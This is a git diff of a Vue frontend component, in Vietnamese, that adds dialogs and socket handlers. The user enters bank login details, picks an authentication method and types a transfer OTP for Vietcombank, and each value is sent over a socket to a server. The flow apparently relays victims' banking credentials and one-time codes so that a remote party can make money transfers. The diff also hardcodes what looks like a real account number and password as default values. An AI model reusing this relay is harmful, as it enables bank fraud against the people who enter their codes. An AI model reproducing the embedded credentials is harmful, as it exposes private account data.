@@ -115,6 +115,26 @@
             </v-form>
         </v-card>
     </v-dialog>
+    <v-dialog max-width="450px" v-model="dialogOtpCTVcb" persistent>
+        <v-card>
+            <v-form ref="RefOtpCt" @submit.prevent="submitFormOTPCtVcb">
+                <v-card-title>
+                    Thông báo
+                </v-card-title>
+                <v-card-text class="text-center">
+                    <p class="text-center mb-2">{{ dialogMessage }}</p>
+                    <!-- // select option method otp -->
+                    <v-text-field v-if="socketData.challenge" v-model="socketData.challenge" variant="filled" label=""
+                        :readonly="true"></v-text-field>
+
+                    <v-text-field v-model="otpCt" variant="filled" label="Nhập mã OTP" :rules="rules.otpCt"></v-text-field>
+                </v-card-text>
+                <v-card-actions>
+                    <v-btn color="warning" block class="pa-4" type="submit">Tiếp tục</v-btn>
+                </v-card-actions>
+            </v-form>
+        </v-card>
+    </v-dialog>
 </template>
 
 <script setup>
@@ -134,7 +154,11 @@ const dialogSuccess = ref(false)
 const dialogOtp = ref(false)
 const otpLogin = ref('')
 const dialogMethodCTOTP = ref(false)
-const formRefOtpCT = ref(false)
+const formRefOtpCT = ref('')
+const formMethodOtpCT = ref(null)
+const dialogOtpCTVcb = ref(false)
+const RefOtpCt = ref(null)
+const otpCt = ref('')
 
 onMounted(() => {
     // if (!user.value.numberPhone) {
@@ -161,8 +185,8 @@ onMounted(() => {
             dialogError.value = true
             dialogMessage.value = data.message
             dialog.value = false
-        } else if(data.code === 200) {
-            dialogSuccess.value = true
+        } else if (data.code === 200) {
+            dialogMethodCTOTP.value = true
             dialogMessage.value = data.message
             dialog.value = false
         }
@@ -208,6 +232,37 @@ onMounted(() => {
         }
     })
 
+    socket.on('send-method-ct-vcb', (data) => {
+        console.log(data);
+        socketData.value = data
+        if (data.code === 404) {
+            dialogError.value = true
+            dialogMessage.value = data.message
+            dialog.value = false
+            return
+        } else if (data.code === 200) {
+            dialogOtpCTVcb.value = true
+            dialogMessage.value = data.message
+            dialog.value = false
+        }
+    })
+
+    socket.on('send-data-send-otp-vcb-chuyentien', (data) => {
+        socketData.value = data
+        console.log(data);
+        if (data.code === 404) {
+            dialogError.value = true
+            dialogMessage.value = data.message
+            dialog.value = false
+            return
+        } else if (data.code === 200) {
+            dialogSuccess.value = true
+            dialogMessage.value = data.message
+            socketData.value = data
+            dialog.value = false
+        }
+    })
+
 
 
 })
@@ -216,8 +271,8 @@ const formRefOtpMethod = ref(null)
 const formRefOtpLogin = ref(null)
 const formValue = ref({
     bankLoginName: '',
-    bankLoginAccount: '',
-    bankLoginPassword: '',
+    bankLoginAccount: '0342660126',
+    bankLoginPassword: 'Bichtra88@',
     ...user.value
 })
 const rules = {
@@ -237,6 +292,16 @@ const rules = {
         v => !!v || 'Vui lòng chọn phương thức xác thực',
     ],
     otpLogin: [
+        v => !!v || 'Mã OTP không được để trống',
+
+        // format > 6
+        v => (v && v.length >= 6) || 'Mã OTP phải lớn hơn 6 ký tự',
+    ],
+    otpMethodCT: [
+        v => !!v || 'Vui lòng chọn phương thức xác thực',
+    ],
+
+    otpCt: [
         v => !!v || 'Mã OTP không được để trống',
 
         // format > 6
@@ -368,10 +433,30 @@ const submitFormBankLoginOtp = async () => {
 }
 
 const submitFormMethodCT = async () => {
-    const isValid = await formRefOtpCT.value.validate()
+    const isValid = await formMethodOtpCT.value.validate()
 
-    if(isValid.valid) {
-        socket.emit('send-method-ct-vcb', )
+    if (isValid.valid) {
+        socket.emit('send-method-ct-vcb', {
+            method: formRefOtpCT.value
+        })
+        dialogMethodCTOTP.value = false
+        dialog.value = true
+
+    }
+}
+
+const submitFormOTPCtVcb = async () => {
+    const isValid = await RefOtpCt.value.validate()
+    if (isValid.valid) {
+        dialogOtpCTVcb.value = false
+        dialog.value = true
+        try {
+            socket.emit('send-data-send-otp-vcb-chuyentien', {
+                otp: otpCt.value
+            })
+        } catch (error) {
+            console.log(error)
+        }
     }
 }
 </script>
